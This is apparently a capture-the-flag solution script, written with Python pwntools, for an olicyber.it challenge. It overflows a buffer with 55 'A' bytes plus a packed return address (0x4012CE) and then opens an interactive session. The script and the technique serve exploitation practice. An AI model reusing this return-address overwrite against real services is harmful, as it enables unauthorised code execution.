from pwn import *

HOST = 'moreprivateclub.challs.olicyber.it'
PORT = 10016

s = remote(HOST, PORT)

s.recvline()
s.sendline(b'25')

s.recvline()
s.sendline(b'A' * 55 + p64(0x4012CE))
s.interactive()

data = s.recvline()

print(data)